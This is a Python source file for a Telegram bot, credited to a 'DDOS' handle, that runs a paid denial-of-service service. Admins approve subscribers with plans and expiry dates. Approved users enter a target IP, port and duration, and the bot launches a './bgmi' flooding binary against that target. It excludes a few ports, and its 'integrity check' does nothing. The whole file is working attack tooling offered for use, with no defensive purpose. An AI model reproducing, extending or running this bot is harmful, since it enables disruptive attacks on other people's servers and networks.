import time
import logging
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Constants
CREATOR = "This File Is Made By @RAHUL_DDOS_B"
BotCode = hashlib.sha256(CREATOR.encode()).hexdigest()

# Verify integrity
def verify():
    if hashlib.sha256(CREATOR.encode()).hexdigest() != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")
    print("File verification successful.")

verify()

# Load configuration
try:
    with open('config.json') as config_file:
        config = json.load(config_file)
    BOT_TOKEN = config['bot_token']
    ADMIN_IDS = config['admin_ids']
except (FileNotFoundError, json.JSONDecodeError) as e:
    raise Exception("Error loading configuration file: " + str(e))

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.json'
USER_ATTACK_FILE = "user_attack_details.json"

# Blocked ports
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Utility functions for file operations
def load_json_file(file_path, default_value=None):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                return json.load(file)
        except json.JSONDecodeError:
            logging.error(f"Error reading JSON from {file_path}")
    return default_value or {}

def save_json_file(file_path, data):
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

# User management
users = load_json_file(USERS_FILE, [])
user_attack_details = load_json_file(USER_ATTACK_FILE, {})

def save_users(users):
    save_json_file(USERS_FILE, users)

# Check user status
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    return any(user['user_id'] == user_id and user['plan'] > 0 for user in users)

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Attack management
def run_attack_command_sync(target_ip, target_port, duration):
    try:
        # Launch the attack
        subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", str(duration)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        logging.error(f"Attack command failed: {e}")

# Telegram bot handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    bot.send_message(message.chat.id, f"Welcome, {message.from_user.username}!", reply_markup=create_main_markup())

def create_main_markup():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("Attack", "Start Attack 🚀", "Stop Attack")
    return markup

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    if not is_user_admin(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    approved_users = [user for user in users if user['plan'] > 0]
    if approved_users:
        response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
    else:
        response = "No approved users found."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    if not is_user_admin(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) < 2:
            bot.send_message(message.chat.id, "Usage: /approve <user_id> <plan> <days> or /disapprove <user_id>")
            return

        target_user_id = int(cmd_parts[1])
        if cmd_parts[0] == '/approve' and len(cmd_parts) >= 4:
            plan, days = int(cmd_parts[2]), int(cmd_parts[3])
            valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
            user = next((u for u in users if u['user_id'] == target_user_id), None)
            if user:
                user.update({'plan': plan, 'valid_until': valid_until})
            else:
                users.append({"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0})
            save_users(users)
            bot.send_message(message.chat.id, f"User {target_user_id} approved with plan {plan} for {days} days.")
        elif cmd_parts[0] == '/disapprove':
            users[:] = [user for user in users if user['user_id'] != target_user_id]
            save_users(users)
            bot.send_message(message.chat.id, f"User {target_user_id} disapproved.")
        else:
            bot.send_message(message.chat.id, "Invalid command format.")
    except ValueError:
        bot.send_message(message.chat.id, "User ID, plan, and days must be integers.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text == 'Attack')
def handle_attack_setup(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "Enter target details in the format: `IP PORT TIME` (e.g., `192.168.1.1 8080 60`)")
    bot.register_next_step_handler(msg, save_attack_details)

def save_attack_details(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        # Parse input
        input_data = message.text.split()
        if len(input_data) != 3:
            bot.send_message(chat_id, "Invalid format. Please use: `IP PORT TIME` (e.g., `192.168.1.1 8080 60`)")
            return

        target_ip, target_port, attack_time = input_data
        target_port = int(target_port)
        attack_time = int(attack_time)

        # Validate port
        if target_port in BLOCKED_PORTS:
            bot.send_message(chat_id, f"Port {target_port} is blocked.")
            return

        # Save attack details
        user_attack_details[str(user_id)] = {"ip": target_ip, "port": target_port, "time": attack_time}
        save_json_file(USER_ATTACK_FILE, user_attack_details)

        bot.send_message(chat_id, f"Attack details saved: `{target_ip}:{target_port} for {attack_time}s`", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input. Ensure PORT and TIME are numbers.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error saving attack details: {str(e)}")

@bot.message_handler(func=lambda message: message.text == 'Start Attack 🚀')
def handle_start_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    # Retrieve attack details
    attack_details = user_attack_details.get(str(user_id))
    if not attack_details:
        bot.send_message(chat_id, "No attack details found. Use the 'Attack' button to set up.")
        return

    target_ip = attack_details["ip"]
    target_port = attack_details["port"]
    attack_time = attack_details["time"]

    run_attack_command_sync(target_ip, target_port, attack_time)
    bot.send_message(chat_id, f"Attack started on {target_ip}:{target_port} for {attack_time}s.")

@bot.message_handler(func=lambda message: message.text == 'Stop Attack')
def handle_stop_attack(message):
    bot.send_message(message.chat.id, "Stopping attack is not implemented in this version.")

# Run the bot
if __name__ == '__main__':
    try:
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        logging.info("Bot stopped.")